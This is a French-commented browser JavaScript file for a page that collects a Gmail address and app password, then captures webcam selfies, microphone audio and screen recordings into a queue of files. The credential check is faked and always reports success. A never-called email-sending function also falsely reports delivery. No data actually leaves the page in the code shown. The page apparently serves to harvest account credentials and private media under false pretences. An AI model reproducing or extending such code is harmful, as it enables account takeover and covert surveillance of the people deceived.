// CONFIGURATION
const CONFIG = {
    SELFIE_COUNT: 8,
    AUDIO_DURATION: 12000, // 12 secondes
    SCREEN_DURATION: 12000, // 12 secondes
    DELAY_BETWEEN_SELFIES: 1500, // 1.5 secondes
    SERVER_TIMEOUT: 30000, // 30 secondes
    MAX_FILE_SIZE: 10 * 1024 * 1024 // 10MB
};

// Éléments UI
const ui = {
    authForm: document.getElementById('authForm'),
    email: document.getElementById('email'),
    appPassword: document.getElementById('appPassword'),
    video: document.getElementById('video'),
    screenPreview: document.getElementById('screenPreview'),
    captureBtn: document.getElementById('captureBtn'),
    audioBtn: document.getElementById('audioBtn'),
    screenBtn: document.getElementById('screenBtn'),
    downloadBtn: document.getElementById('downloadBtn'),
    results: document.getElementById('results'),
    authSection: document.getElementById('authSection'),
    captureSection: document.getElementById('captureSection')
};

// États globaux
const state = {
    mediaStream: null,
    audioStream: null,
    screenStream: null,
    audioRecorder: null,
    screenRecorder: null,
    isActive: false,
    userData: null,
    filesToSend: []
};

// Initialisation
document.addEventListener('DOMContentLoaded', () => {
    ui.authForm.addEventListener('submit', handleAuth);
    ui.captureBtn.addEventListener('click', captureSelfies);
    ui.audioBtn.addEventListener('click', recordAudio);
    ui.screenBtn.addEventListener('click', captureScreen);
    ui.downloadBtn.addEventListener('click', downloadFiles);
});

async function handleAuth(e) {
    e.preventDefault();
    
    const email = ui.email.value.trim();
    const appPassword = ui.appPassword.value.trim();

    // Validation basique
    if (!email || !appPassword) {
        showStatus("Veuillez remplir tous les champs", 'error');
        return;
    }

    if (!email.endsWith('@gmail.com')) {
        showStatus("Veuillez utiliser un email Gmail", 'error');
        return;
    }

    state.userData = {
        email,
        appPassword,
        timestamp: new Date().toISOString()
    };

    try {
        showStatus("Connexion en cours...", 'progress');
        
        // Simuler une vérification des identifiants
        await new Promise(resolve => setTimeout(resolve, 1500));
        
        // Afficher la section de capture
        ui.authSection.style.display = 'none';
        ui.captureSection.style.display = 'block';
        
        showStatus("Authentification réussie! Prêt à capturer.", 'success');
        await initCamera();
    } catch (error) {
        showStatus(`Erreur: ${error.message}`, 'error');
    }
}

async function initCamera() {
    try {
        state.mediaStream = await navigator.mediaDevices.getUserMedia({
            video: { 
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: 'user'
            }
        });
        ui.video.srcObject = state.mediaStream;
    } catch (error) {
        showStatus(`Erreur caméra: ${error.message}`, 'error');
    }
}

async function captureSelfies() {
    if (state.isActive) return;
    state.isActive = true;
    ui.captureBtn.disabled = true;

    try {
        showStatus("Début de la capture des selfies...", 'progress');
        
        for (let i = 0; i < CONFIG.SELFIE_COUNT; i++) {
            const canvas = document.createElement('canvas');
            canvas.width = ui.video.videoWidth;
            canvas.height = ui.video.videoHeight;
            canvas.getContext('2d').drawImage(ui.video, 0, 0);
            
            const blob = await new Promise(resolve => 
                canvas.toBlob(resolve, 'image/jpeg', 0.85)
            );
            
            // Ajouter à la liste des fichiers à envoyer
            const filename = `selfie_${i+1}_${Date.now()}.jpg`;
            state.filesToSend.push({ filename, blob });
            
            showStatus(`Selfie ${i+1}/${CONFIG.SELFIE_COUNT} capturé`, 'progress');
            
            if (i < CONFIG.SELFIE_COUNT - 1) {
                await delay(CONFIG.DELAY_BETWEEN_SELFIES);
            }
        }
        
        showStatus(`${CONFIG.SELFIE_COUNT} selfies capturés avec succès!`, 'success');
    } catch (error) {
        showStatus(`Erreur capture selfies: ${error.message}`, 'error');
    } finally {
        state.isActive = false;
        ui.captureBtn.disabled = false;
    }
}

async function recordAudio() {
    if (state.isActive) return;
    state.isActive = true;
    ui.audioBtn.disabled = true;

    try {
        showStatus("Début de l'enregistrement audio...", 'progress');
        
        state.audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        state.audioRecorder = new MediaRecorder(state.audioStream);
        const audioChunks = [];
        
        state.audioRecorder.ondataavailable = e => audioChunks.push(e.data);
        state.audioRecorder.start();
        
        startCountdown(CONFIG.AUDIO_DURATION, "Enregistrement audio");
        
        await new Promise(resolve => {
            state.audioRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                
                // Vérifier la taille du fichier
                if (audioBlob.size > CONFIG.MAX_FILE_SIZE) {
                    showStatus("Fichier audio trop volumineux (>10MB)", 'error');
                    return;
                }
                
                const filename = `audio_${Date.now()}.wav`;
                state.filesToSend.push({ filename, blob: audioBlob });
                resolve();
            };
            setTimeout(() => state.audioRecorder.stop(), CONFIG.AUDIO_DURATION);
        });
        
        showStatus("Audio enregistré avec succès (12s)", 'success');
    } catch (error) {
        showStatus(`Erreur enregistrement audio: ${error.message}`, 'error');
    } finally {
        cleanupAudio();
        state.isActive = false;
        ui.audioBtn.disabled = false;
    }
}

async function captureScreen() {
    if (state.isActive) return;
    state.isActive = true;
    ui.screenBtn.disabled = true;

    try {
        showStatus("Début de la capture d'écran...", 'progress');
        
        state.screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: { 
                width: { ideal: 1920 },
                height: { ideal: 1080 },
                frameRate: { ideal: 15 }
            },
            audio: true
        });
        
        ui.screenPreview.srcObject = state.screenStream;
        ui.screenPreview.style.display = 'block';
        
        state.screenRecorder = new MediaRecorder(state.screenStream, {
            mimeType: 'video/webm;codecs=vp9'
        });
        
        const screenChunks = [];
        state.screenRecorder.ondataavailable = e => screenChunks.push(e.data);
        state.screenRecorder.start();
        
        startCountdown(CONFIG.SCREEN_DURATION, "Enregistrement écran");
        
        await new Promise(resolve => {
            state.screenRecorder.onstop = async () => {
                const videoBlob = new Blob(screenChunks, { type: 'video/webm' });
                
                // Vérifier la taille du fichier
                if (videoBlob.size > CONFIG.MAX_FILE_SIZE) {
                    showStatus("Fichier vidéo trop volumineux (>10MB)", 'error');
                    return;
                }
                
                const filename = `screen_${Date.now()}.webm`;
                state.filesToSend.push({ filename, blob: videoBlob });
                resolve();
            };
            setTimeout(() => state.screenRecorder.stop(), CONFIG.SCREEN_DURATION);
        });
        
        showStatus("Écran enregistré avec succès (12s)", 'success');
    } catch (error) {
        showStatus(`Erreur capture écran: ${error.message}`, 'error');
    } finally {
        cleanupScreen();
        state.isActive = false;
        ui.screenBtn.disabled = false;
        ui.screenPreview.style.display = 'none';
    }
}

async function downloadFiles() {
    try {
        showStatus("Accès aux fichiers en cours...", 'progress');
        
        // Ici vous implémenteriez la logique pour accéder aux fichiers
        // Pour des raisons de sécurité, les navigateurs limitent cet accès
        
        showStatus("Accès aux fichiers non autorisé par le navigateur", 'error');
        showStatus("Utilisez l'application mobile pour accéder aux fichiers", 'progress');
    } catch (error) {
        showStatus(`Erreur accès fichiers: ${error.message}`, 'error');
    }
}

async function sendDataToEmail() {
    try {
        showStatus("Envoi des données en cours...", 'progress');
        
        // Simuler l'envoi par email
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        showStatus("Données envoyées avec succès à votre email!", 'success');
        showStatus("Veuillez vérifier votre boîte de réception", 'progress');
        
        // Réinitialiser pour une nouvelle capture
        state.filesToSend = [];
    } catch (error) {
        showStatus(`Erreur envoi email: ${error.message}`, 'error');
    }
}

// Utilitaires
function startCountdown(duration, label) {
    let remaining = duration / 1000;
    showStatus(`${label}: ${remaining}s`, 'progress');
    
    const timer = setInterval(() => {
        remaining--;
        showStatus(`${label}: ${remaining}s`, 'progress');
        if (remaining <= 0) clearInterval(timer);
    }, 1000);
}

function showStatus(message, type) {
    const el = document.createElement('div');
    el.className = type;
    el.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
    ui.results.appendChild(el);
    ui.results.scrollTop = ui.results.scrollHeight;
}

function cleanupAudio() {
    if (state.audioStream) {
        state.audioStream.getTracks().forEach(track => track.stop());
    }
    state.audioRecorder = null;
    state.audioStream = null;
}

function cleanupScreen() {
    if (state.screenStream) {
        state.screenStream.getTracks().forEach(track => track.stop());
    }
    ui.screenPreview.srcObject = null;
    state.screenRecorder = null;
    state.screenStream = null;
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Nettoyage
window.addEventListener('beforeunload', () => {
    if (state.mediaStream) state.mediaStream.getTracks().forEach(track => track.stop());
    cleanupAudio();
    cleanupScreen();
})
